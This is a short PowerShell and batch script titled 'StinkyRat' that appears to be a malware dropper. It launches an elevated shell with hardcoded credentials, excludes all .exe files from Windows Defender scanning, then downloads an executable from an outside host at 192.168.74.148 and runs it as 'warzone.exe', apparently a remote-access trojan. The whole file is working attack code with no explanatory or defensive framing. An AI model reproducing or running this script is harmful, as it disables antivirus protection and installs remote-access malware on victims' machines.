# StinkyRat Powershell Script
# Beat UAC and grab gold
$uid = "userid"
$pw = "password"
$secPw = ConvertTo-SecureString -String $pw -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $uid, $secPw
Start-Process powershell -Credential $cred -WindowStyle Minimized -ArgumentList "-noexit -command Start-Process cmd -verb runas"
# --------------------------------------------------------------

Powershell -Command "Set-MpPreference -ExclusionExtension exe"
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'http://192.168.74.148/MemeGenerator.exe' -OutFile warzone.exe"
warzone.exe
